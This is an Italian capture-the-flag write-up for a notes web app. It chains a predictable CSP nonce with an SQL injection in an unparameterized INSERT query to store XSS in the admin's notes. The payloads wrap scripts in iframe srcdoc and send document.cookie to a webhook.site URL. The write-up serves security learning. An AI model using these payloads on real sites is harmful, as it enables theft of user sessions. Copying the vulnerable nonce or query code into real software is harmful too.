# XSS con Nonce Bypass ed SQL Injection

Il servizio si presenta come un sito web dove è possibile salvare delle note senza fare il login. Perché questo sia possibile, salva la sessione nel cookie sotto forma di JWT. Per evitare XSS utilizza il nonce, una stringa che viene inserita dal server come attributo ai tag `<script>`, che non vengono eseguiti se non la possiedono. (Se provassimo ad inserire degli script, verrebbero sì renderizzati, ma non eseguiti perché non conosciamo il nonce).

## Generazione Nonce Vulnerabile

Il nonce viene generato così:

```javascript
// generate the csp nonce
app.use(function (req, res, next) {
    const random = parseInt(Math.random() * 100000000000000000000000);
    res.locals.csp_nonce = crypto.createHash('md5').update(`${random}`).digest('base64');
    res.set('Content-Security-Policy', `script-src 'nonce-${res.locals.csp_nonce}';`);
    next();
});
```

Questo modo di generare il nonce è vulnerabile, perché sta generando semplicemente un numero da 0 a 9. Possiamo quindi ricaricare diverse volte la pagina per raccogliere tutti i nonce possibili.

---

## SQL Injection

La flag è presente nel cookie dell'admin. Per ottenerla dobbiamo fare in modo che quest'ultimo visiti (tramite la funzione di report abusi) una nostra nota, o meglio, una nota con il contenuto inserito da noi.

Quando inseriamo una nota viene utilizzata questa query:

```javascript
app.post('/api/note', async (req, res) => {
    const content = req.body.content;
    // console.log(content)
    const last_note_id = (await db_get(`SELECT MAX(noteid) AS last FROM notes WHERE userid = ${req.loggedUserId}`))['last'] ?? -1;
    const noteid = last_note_id + 1;
    const x = await db_get(`INSERT INTO notes (noteid, userid, content) VALUES (${noteid}, ${req.loggedUserId}, '${content}')`); // sql injection
    res.json({ noteid });
});
```

La query non usa prepared statements ed è perciò vulnerabile a una SQL injection. Possiamo sfruttarla per inserire del contenuto in una nota non nostra, come ad esempio quelle dell'admin (che ha `id = 0`) con una query come questa:

```sql
nulla'), (12345, 0, 'ciao Admin!
```

---

## Combinazione delle Vulnerabilità

A questo punto dobbiamo combinare queste due vulnerabilità per fare eseguire dal browser dell'admin del codice scritto da noi. Utilizziamo quindi i nonce raccolti in precedenza per formare un payload di questo tipo (ricordiamo che se inseriamo due volte una nota con lo stesso ID darà errore):

```html
'), (123456, 0, '<script nonce="qH/2eaLz5x2RgaZ7dUISLA">fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script><script nonce="7MvIfktc4v4oMI/Z8qe68w">fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>...
```

Notiamo però che questi script non vengono eseguiti. Dobbiamo quindi racchiuderli in `<iframe>` perché il browser provi ad eseguirli almeno una volta:

```html
<iframe srcdoc="<script nonce=qH/2eaLz5x2RgaZ7dUISLA==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=7MvIfktc4v4oMI/Z8qe68w==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=jxTkX87qFnpaNt7dS+olQw==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=5No7f7vOI0XXdysGdKMY1Q==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=RcSMzi4tf73qGvxRx8atJg==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=yB5yjZ1ML2NvBn+JzBSGLA==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=xMpCOKC5I4INzFCab3WEmw==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=yfD4lfuYq5FZ9R/QKX4jbQ==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
<iframe srcdoc="<script nonce=FnkJHFqID69vteYIfrGy3A==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
```

---

## Payload Finale

```html
'), (1234567, 0, <iframe srcdoc="<script nonce=qH/2eaLz5x2RgaZ7dUISLA==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=7MvIfktc4v4oMI/Z8qe68w==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=jxTkX87qFnpaNt7dS+olQw==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=5No7f7vOI0XXdysGdKMY1Q==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=RcSMzi4tf73qGvxRx8atJg==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=yB5yjZ1ML2NvBn+JzBSGLA==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=xMpCOKC5I4INzFCab3WEmw==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe><iframe srcdoc="<script nonce=yfD4lfuYq5FZ9R/QKX4jbQ==>fetch(`http://webhook.site/fec91053-7479-4ceb-83c1-ff8bebdf6eae?`+document.cookie)</script>"></iframe>
```